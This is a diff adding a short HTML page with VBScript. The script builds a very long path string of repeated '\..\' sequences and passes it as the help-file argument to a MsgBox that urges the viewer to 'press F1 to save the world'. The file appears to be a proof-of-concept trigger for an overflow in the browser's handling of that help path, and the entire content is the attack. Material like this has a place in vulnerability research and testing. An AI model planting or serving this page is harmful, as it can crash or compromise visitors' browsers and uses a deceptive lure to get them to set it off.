@@ -1,0 +1,12 @@
+&lt;html&gt;
+&lt;script type=&quot;text/vbscript&quot;&gt;
+big = &quot;aaaa&quot;
+
+For i=1 to 4500
+  big = big &amp; &quot;\..\&quot;
+Next
+
+
+MsgBox &quot;please press F1 to save the world&quot;, ,&quot;please save the world&quot;, big, 1
+&lt;/script&gt;
+&lt;/html&gt;
